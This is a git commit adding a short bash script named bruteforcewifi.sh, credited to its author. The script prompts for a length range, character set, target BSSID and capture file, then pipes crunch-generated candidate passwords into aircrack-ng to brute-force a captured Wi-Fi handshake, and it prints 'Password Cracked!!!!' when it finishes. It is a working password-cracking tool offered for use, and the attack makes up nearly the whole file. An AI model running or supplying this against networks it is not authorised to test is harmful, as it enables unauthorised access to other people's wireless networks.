13a5fcd2672f30526ee4d459006776a3d0442dcd
manjitsaha <manjitsaha01@gmail.com>
2018-03-30 17:27:39 +0530

    Add files via upload

---
+++ bruteforcewifi.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+echo "-----Tool Created By Manjit Saha-----"
+
+read -p "Enter Minimun No. " A
+read -p "Enter Maximum No. " B
+read -p "Enter your combination: " C
+read -p "Enter your bssid: " D
+read -p "Enter path of the .cap file: " E
+ 
+crunch $A $B $C|aircrack-ng --bssid $D -w- $E
+
+
+echo "    -------------------------------------------------"
+echo "    -------------------------------------------------"
+echo "    ------------Password Cracked!!!!-----------------"
+echo "    -------------------------------------------------"
+echo "       -----Tool Created By Manjit Saha-----"
+echo "    -------------------------------------------------"
+echo "    -------------------------------------------------"
+echo "    -------------------------------------------------"
